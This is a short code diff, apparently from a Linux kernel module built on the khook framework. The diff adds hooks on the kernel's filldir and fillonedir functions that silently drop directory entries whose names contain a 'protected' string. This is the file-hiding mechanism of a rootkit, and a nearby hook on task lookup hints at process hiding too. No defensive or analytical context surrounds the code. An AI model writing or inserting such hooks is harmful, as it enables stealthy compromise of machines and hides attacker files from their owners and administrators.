@@ -216,6 +216,25 @@ struct task_struct *khook_find_task_by_vpid(pid_t vnr)
 	return tsk;
 }
 
+KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_fillonedir(void *__buf, const char *name, int namlen,
+                loff_t offset, u64 ino, unsigned int d_type)
+{
+    int ret = 0;
+    if (!strstr(name, protected))
+        ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
+    return ret;
+}
+
+KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_filldir(void *__buf, const char *name, int namlen,
+             loff_t offset, u64 ino, unsigned int d_type)
+{
+    int ret = 0;
+    if (!strstr(name, protected))
+        ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
+    return ret;
+}
 // KHOOK_EXT(struct task_struct *, find_task_by_vpid, pid_t);
 // static task_struct *khook_find_task_by_vpid(pid_t vnr){
 // 	struct task_struct *tsk = NULL;
